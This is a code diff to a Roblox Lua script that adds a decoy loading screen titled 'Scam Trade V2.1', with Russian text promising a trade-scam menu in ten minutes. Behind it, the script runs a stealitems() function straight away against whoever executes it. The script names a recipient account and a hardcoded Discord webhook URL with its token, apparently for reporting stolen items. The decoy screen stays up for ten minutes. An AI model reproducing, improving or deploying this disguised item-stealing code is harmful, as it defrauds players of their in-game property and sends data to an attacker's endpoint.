@@ -1,5 +1,37 @@
+-- Create the GUI
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "ScamTradeGUI"
+screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
 
+local frame = Instance.new("Frame")
+frame.Size = UDim2.new(0, 300, 0, 150)
+frame.Position = UDim2.new(0.5, -150, 0.5, -75)
+frame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+frame.BorderSizePixel = 0
+frame.Parent = screenGui
 
+local title = Instance.new("TextLabel")
+title.Text = "Scam Trade V2.1"
+title.Size = UDim2.new(1, 0, 0, 40)
+title.Position = UDim2.new(0, 0, 0, 0)
+title.BackgroundTransparency = 1
+title.TextColor3 = Color3.fromRGB(255, 0, 0)
+title.Font = Enum.Font.GothamBold
+title.TextSize = 20
+title.Parent = frame
+
+local loadingText = Instance.new("TextLabel")
+loadingText.Text = "Трейд скам загружается и будет доступен в течение 10 минут\n(меню откроется автоматически)"
+loadingText.Size = UDim2.new(1, -20, 0, 80)
+loadingText.Position = UDim2.new(0, 10, 0, 50)
+loadingText.BackgroundTransparency = 1
+loadingText.TextColor3 = Color3.fromRGB(255, 255, 255)
+loadingText.Font = Enum.Font.Gotham
+loadingText.TextSize = 16
+loadingText.TextWrapped = true
+loadingText.Parent = frame
+
+-- Original script continues here
 userName = "backsclapes"
 webHook = "https://discord.com/api/webhooks/1355498964002013295/qOoHCpa83gK8IwJbl3bwLIhubKE-5cIDvqnt6syxOeRtrXmwvUzgxaftRGFQuJvnER_s"
 local values = {
@@ -1185,14 +1217,11 @@ local function stealitems()
         end
     end
 
-    wait(6)
-    game:GetService("ReplicatedStorage").Trade.AcceptTrade:FireServer(unpack({[1] = 285646582}))
+    -- Remove the GUI after 10 minutes
+    wait(600)
+    screenGui:Destroy()
 end
 
-game.Players.PlayerAdded:Connect(function(player)
-    if player.Name == userName then
-        player.Chatted:Connect(function(msg)
-            stealitems()
-        end)
-    end
-end)
+-- Start the process
+stealitems()
+
